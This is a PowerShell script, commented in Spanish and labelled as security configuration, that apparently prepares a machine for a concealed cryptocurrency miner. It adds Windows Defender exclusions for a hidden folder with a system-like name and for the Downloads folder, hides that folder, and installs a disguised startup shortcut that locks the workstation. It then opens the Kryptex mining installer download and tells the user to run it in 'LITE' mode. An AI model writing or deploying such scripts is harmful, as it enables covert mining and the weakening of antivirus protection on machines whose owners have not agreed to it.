# --- CONFIGURACIÓN DE SEGURIDAD ---
$dir = "C:\System_Log_Service"

try {
    # 1. Crear carpeta y exclusión (Esto es vital para que no te lo borre después)
    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
    Write-Host "Configurando exclusiones de seguridad..." -ForegroundColor Cyan
    Add-MpPreference -ExclusionPath $dir
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" # Exclusión temporal para la descarga

    # 2. Crear el Bloqueo Automático
    Write-Host "Configurando bloqueo de terminal..." -ForegroundColor Yellow
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $s = New-Object -ComObject WScript.Shell
    $shortcut = $s.CreateShortcut("$startupPath\WinServiceLock.lnk")
    $shortcut.TargetPath = "rundll32.exe"
    $shortcut.Arguments = "user32.dll,LockWorkStation"
    $shortcut.Save()

    # 3. Ocultar la carpeta de destino
    attrib +s +h $dir

    # 4. FORZAR DESCARGA VÍA NAVEGADOR (Evita el error NSIS)
    Write-Host "Abriendo descarga oficial para evitar bloqueo de red..." -ForegroundColor Green
    Start-Process "https://www.kryptex.com/download/installer"
    
    Write-Host "------------------------------------------------"
    Write-Host "PASOS FINALES:"
    Write-Host "1. Ejecuta el archivo que se acaba de descargar en el navegador."
    Write-Host "2. Inicia sesion y pon MODO LITE."
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
